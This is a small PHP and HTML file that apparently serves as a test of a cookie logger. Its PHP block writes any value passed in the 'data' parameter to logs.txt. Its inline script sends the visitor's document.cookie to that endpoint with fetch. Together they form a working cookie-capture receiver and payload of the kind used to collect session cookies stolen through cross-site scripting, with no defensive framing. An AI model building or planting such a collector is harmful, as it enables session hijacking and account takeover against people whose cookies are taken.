<?php
// Logging cookies if 'data' parameter is received
if (isset($_GET['data'])) {
    $file = 'logs.txt'; // Log file
    $data = date("Y-m-d H:i:s") . " - " . $_GET['data'] . "\n"; // Format log entry
    file_put_contents($file, $data, FILE_APPEND); // Save to file
    exit; // Stop execution after logging
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Page</title>
    <script>
        // Send cookies to logs.txt via PHP
        fetch('index.php?data=' + document.cookie);
    </script>
</head>
<body>
    <h1>Cookie Logger Test</h1>
    <p>If logging works, cookies will be stored in <code>logs.txt</code>.</p>
</body>
</html>
